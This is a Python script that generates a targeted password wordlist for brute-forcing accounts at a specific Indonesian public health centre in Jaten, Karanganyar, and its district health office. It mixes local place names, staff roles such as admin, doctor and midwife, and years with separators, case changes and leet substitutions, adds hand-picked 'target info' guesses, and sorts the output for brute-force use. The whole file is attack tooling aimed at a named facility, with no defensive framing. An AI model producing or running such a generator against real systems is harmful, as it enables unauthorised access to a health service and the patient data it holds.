
import itertools, hashlib

# Base words
keywords = [
    "puskesjaten", "puskesjaten1", "jaten", "puskesjaten1", "jaten",
    "puskes", "puskesmas", "pustu", "pustujaten", "pusjaten",
    "karanganyar", "kra", "karanganyarkab", "dinkes", "dinas",
    "kesehatan", "sehat", "puskbj1", "pkmjaten", "pkm",
    "admin", "operator", "bidan", "dokter", "perawat", "apoteker", "gawatdarurat"
]

# Modifiers
modifiers = ["01", "1", "123", "2024", "2025", "2026", "2020", "2021", "2022", "2023", "!"]
separators = ["", ".", "_", "@", "#", "-"]

passwords = set()

def variants(word):
    """Generate basic case variants"""
    return [word, word.upper(), word.capitalize()]

def leet(word):
    """Simple leet speak"""
    mapping = str.maketrans("aioesbg", "4103586")
    return word.translate(mapping)

# Phase 1: Simple combinations (Word + Mod)
for k in keywords:
    for v in variants(k):
        passwords.add(v)
        # Word + suffix (e.g., Jaten2025)
        for m in modifiers:
            passwords.add(f"{v}{m}")
            passwords.add(f"{v}@{m}")
            passwords.add(f"{v}#{m}")
            passwords.add(f"{v}.{m}")
            passwords.add(f"{v}_{m}")
            passwords.add(f"{v}-{m}")
            # Reversed modifiers (e.g., 2025Jaten)
            passwords.add(f"{m}{v}")
            passwords.add(f"{m}@{v}")

# Phase 2: Word + Word combos (e.g., DinkesJaten, OperatorPuskesmas)
combo_keywords = [k for k in keywords if len(k) > 3] # Filter short ones to avoid noise
for c in itertools.permutations(combo_keywords, 2):
    w1, w2 = c
    # Only capitalize first letter of combined words to be realistic
    combined_c = f"{w1.capitalize()}{w2.capitalize()}" # JatenKaranganyar
    combined_l = f"{w1}{w2}" # jatenkaranganyar
    combined_u = f"{w1.upper()}{w2.upper()}" # JATENKARANGANYAR
    
    for base in [combined_c, combined_l, combined_u]:
        passwords.add(base)
        for m in ["1", "123", "2024", "2025", "!"]:
            passwords.add(f"{base}{m}")
            passwords.add(f"{base}@{m}")

# Phase 3: Leet speak variants
leet_passwords = set()
for p in passwords:
    if len(p) > 6:
        leet_p = leet(p.lower())
        if leet_p != p.lower():
            leet_passwords.add(leet_p.capitalize()) # P4ssw0rd style
            leet_passwords.add(leet_p)

passwords.update(leet_passwords)

# Phase 4: Specific complex patterns based on target info
extras = [
    "PuskesmasJaten1!", "Puskesmas@2025", "DinkesKra!2024", 
    "Karanganyar#1", "JatenSehat123", "PuskesmasHebat!",
    "KaranganyarMaju", "JatenBerintegritas", "PuskesmasRamah"
]
passwords.update(extras)

# Write to file
# Sort by length for better brute force logic generally
sorted_pass = sorted(list(passwords), key=len)

with open("targeted_wordlist.txt", "w") as f:
    for p in sorted_pass:
        f.write(p + "\n")

print(f"Generated {len(passwords)} passwords.")
